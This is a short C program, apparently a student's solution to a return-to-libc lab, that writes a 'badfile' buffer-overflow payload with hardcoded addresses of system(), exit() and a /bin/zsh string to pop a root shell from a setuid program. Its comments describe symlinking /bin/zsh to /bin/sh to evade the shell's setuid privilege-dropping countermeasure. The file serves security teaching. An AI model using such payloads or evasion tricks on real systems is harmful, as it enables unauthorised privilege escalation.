#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// --------------------------------------------------------------- //
// In the last lab, we had to use zsh instead of bash to gain root.
// We need to do the same thing for this exploit. If you
// run the program without creating a symbolic link between /bin/zsh
// and /bin/sh you will be able to gain a shell, but not a root shell.
//
// To create a symbolic link, do sudo ln -sf /bin/zsh /bin/sh  
// By linking bash and zsh, we evade the countermeasure that drops
// setUID privilege. 
//
// Okay two days later, I tried this without creating the symbolic 
// link and it worked fine. So maybe that's not as important as I
// thought.     
// --------------------------------------------------------------- //


int main(int argc, char **argv)
{

   char buf[40];

   FILE *badfile;

   badfile = fopen("./badfile", "w");

					//-------------------
   *(long *) &buf[24] = 0xb7e42da0;	// system() location
					// 
   *(long *) &buf[28] = 0xb7e369d0;	// exit() location
					//
   *(long *) &buf[32] = 0xbffffdee;	// /bin/zsh location
					// ------------------

   fwrite(buf, sizeof(buf), 1, badfile);
   fclose(badfile);

}

